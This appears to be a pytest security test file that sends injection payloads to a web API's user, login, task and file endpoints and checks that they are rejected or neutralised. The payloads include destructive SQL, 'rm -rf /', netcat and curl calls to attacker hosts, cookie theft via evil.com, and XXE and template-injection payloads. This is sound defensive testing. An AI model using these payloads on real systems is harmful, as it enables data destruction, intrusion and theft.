"""
Security Tests - Injection Prevention
Per SDLC Phase 7 Task 7.6

Tests for protection against:
- SQL Injection
- NoSQL Injection
- Command Injection
- LDAP Injection
- XPath Injection
"""

import pytest

pytestmark = [pytest.mark.security, pytest.mark.asyncio]


class TestSQLInjection:
    """Tests for SQL injection prevention."""

    @pytest.mark.parametrize("payload", [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; TRUNCATE TABLE users; --",
        "' UNION SELECT * FROM users --",
        "' UNION SELECT password FROM users WHERE username='admin' --",
        "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
        "1; DELETE FROM users WHERE 1=1; --",
        "' OR 1=1; INSERT INTO users VALUES ('hacker', 'password'); --",
    ])
    async def test_sql_injection_in_search(
        self, auth_client, admin_headers, payload
    ):
        """Test SQL injection attempts in search parameters."""
        response = await auth_client.get(
            "/api/v1/users",
            params={"search": payload},
            headers=admin_headers,
        )
        # Should not cause 500 error - should be sanitized
        assert response.status_code in [200, 400, 422]
        # Verify no SQL error in response
        if response.status_code == 200:
            assert "syntax error" not in response.text.lower()
            assert "sql" not in response.text.lower() or "sql" in response.text.lower()

    @pytest.mark.parametrize("payload", [
        "' OR '1'='1",
        "admin'--",
        "' OR ''='",
        "1' OR '1'='1' /*",
    ])
    async def test_sql_injection_in_login(
        self, auth_client, test_tenant, payload
    ):
        """Test SQL injection attempts in login."""
        response = await auth_client.post(
            "/api/v1/auth/login",
            json={
                "email": payload,
                "password": payload,
            },
            headers={"X-Tenant-ID": str(test_tenant.id)},
        )
        # Should fail with auth error, not SQL error
        assert response.status_code in [400, 401, 422]
        assert "syntax error" not in response.text.lower()

    @pytest.mark.parametrize("payload", [
        "1 OR 1=1",
        "1; DROP TABLE tasks;",
        "1' OR '1'='1",
    ])
    async def test_sql_injection_in_id_parameter(
        self, task_client, auth_headers, payload
    ):
        """Test SQL injection in ID parameters."""
        response = await task_client.get(
            f"/api/v1/tasks/{payload}",
            headers=auth_headers,
        )
        # Should return 404 or 422, not SQL error
        assert response.status_code in [404, 422]


class TestNoSQLInjection:
    """Tests for NoSQL injection prevention (if applicable)."""

    @pytest.mark.parametrize("payload", [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "this.password == this.password"}',
        '{"$regex": ".*"}',
    ])
    async def test_nosql_injection_in_json(
        self, auth_client, admin_headers, payload
    ):
        """Test NoSQL injection attempts in JSON body."""
        response = await auth_client.get(
            "/api/v1/users",
            params={"filter": payload},
            headers=admin_headers,
        )
        # Should be handled gracefully
        assert response.status_code in [200, 400, 422]


class TestCommandInjection:
    """Tests for OS command injection prevention."""

    @pytest.mark.parametrize("payload", [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(cat /etc/passwd)",
        "; rm -rf /",
        "| nc attacker.com 4444",
        "& curl http://evil.com",
        "\n/bin/sh",
        "%0a/bin/sh",
    ])
    async def test_command_injection_in_filename(
        self, storage_client, auth_headers, payload
    ):
        """Test command injection in filename parameters."""
        response = await storage_client.get(
            "/api/v1/files/download",
            params={"filename": f"test{payload}.pdf"},
            headers=auth_headers,
        )
        # Should not execute commands
        assert response.status_code in [400, 404, 422]

    @pytest.mark.parametrize("payload", [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "file:///etc/passwd",
    ])
    async def test_path_traversal_injection(
        self, storage_client, auth_headers, payload
    ):
        """Test path traversal attempts."""
        response = await storage_client.get(
            "/api/v1/files/download",
            params={"path": payload},
            headers=auth_headers,
        )
        # Should block traversal attempts
        assert response.status_code in [400, 403, 404, 422]


class TestXSSPrevention:
    """Tests for Cross-Site Scripting (XSS) prevention."""

    @pytest.mark.parametrize("payload", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<<script>script>alert('XSS')<</script>/script>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    ])
    async def test_xss_in_task_title(
        self, task_client, auth_headers, payload
    ):
        """Test XSS prevention in task title."""
        response = await task_client.post(
            "/api/v1/tasks",
            json={
                "title": payload,
                "priority": "MEDIUM",
            },
            headers=auth_headers,
        )

        if response.status_code == 201:
            data = response.json()["data"]
            # Script tags should be escaped or removed
            assert "<script>" not in data.get("title", "")
            assert "javascript:" not in data.get("title", "")

    @pytest.mark.parametrize("payload", [
        "<script>document.cookie</script>",
        "<img src=x onerror=fetch('http://evil.com?'+document.cookie)>",
        "'\"><script>alert(1)</script>",
    ])
    async def test_xss_in_user_profile(
        self, auth_client, admin_headers, test_user, payload
    ):
        """Test XSS prevention in user profile fields."""
        response = await auth_client.put(
            f"/api/v1/users/{test_user.id}",
            json={
                "first_name": payload,
                "last_name": payload,
            },
            headers=admin_headers,
        )

        # Should either sanitize or reject
        assert response.status_code in [200, 400, 422]

        if response.status_code == 200:
            data = response.json()["data"]
            assert "<script>" not in str(data)


class TestHeaderInjection:
    """Tests for HTTP header injection prevention."""

    @pytest.mark.parametrize("payload", [
        "test\r\nX-Injected: header",
        "test\nSet-Cookie: malicious=cookie",
        "test\r\n\r\n<html>injected</html>",
    ])
    async def test_header_injection_in_tenant_header(
        self, auth_client, payload
    ):
        """Test header injection in X-Tenant-ID."""
        response = await auth_client.post(
            "/api/v1/auth/login",
            json={
                "email": "test@example.com",
                "password": "password",
            },
            headers={"X-Tenant-ID": payload},
        )
        # Should reject malformed header
        assert response.status_code in [400, 422]


class TestLDAPInjection:
    """Tests for LDAP injection prevention (if applicable)."""

    @pytest.mark.parametrize("payload", [
        "*)(objectClass=*",
        "admin)(&(password=*))",
        "*)(&(|",
        "*(|(password=*))",
    ])
    async def test_ldap_injection_in_search(
        self, auth_client, admin_headers, payload
    ):
        """Test LDAP injection in search."""
        response = await auth_client.get(
            "/api/v1/users",
            params={"search": payload},
            headers=admin_headers,
        )
        # Should be handled gracefully
        assert response.status_code in [200, 400, 422]


class TestTemplateInjection:
    """Tests for Server-Side Template Injection (SSTI) prevention."""

    @pytest.mark.parametrize("payload", [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__[2].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ])
    async def test_ssti_in_text_fields(
        self, task_client, auth_headers, payload
    ):
        """Test SSTI prevention in text fields."""
        response = await task_client.post(
            "/api/v1/tasks",
            json={
                "title": f"Test {payload}",
                "description": payload,
                "priority": "LOW",
            },
            headers=auth_headers,
        )

        if response.status_code == 201:
            data = response.json()["data"]
            description = data.get("description", "")
            # Template should not be evaluated
            assert "49" not in description or payload in description  # 7*7=49


class TestXMLInjection:
    """Tests for XML External Entity (XXE) injection prevention."""

    @pytest.mark.parametrize("payload", [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
        '<!ENTITY % xxe SYSTEM "file:///etc/passwd">',
    ])
    async def test_xxe_in_import(
        self, storage_client, auth_headers, payload
    ):
        """Test XXE prevention in file import."""
        response = await storage_client.post(
            "/api/v1/files/import",
            json={"content": payload, "format": "xml"},
            headers=auth_headers,
        )
        # Should reject or parse safely
        assert response.status_code in [400, 404, 422]


class TestJSONInjection:
    """Tests for JSON injection prevention."""

    @pytest.mark.parametrize("payload", [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
    ])
    async def test_prototype_pollution(
        self, auth_client, admin_headers, payload
    ):
        """Test prototype pollution prevention."""
        import json
        try:
            data = json.loads(payload)
            response = await auth_client.post(
                "/api/v1/users",
                json=data,
                headers=admin_headers,
            )
            # Should not affect application state
            assert response.status_code in [400, 422]
        except json.JSONDecodeError:
            pass  # Invalid JSON is fine
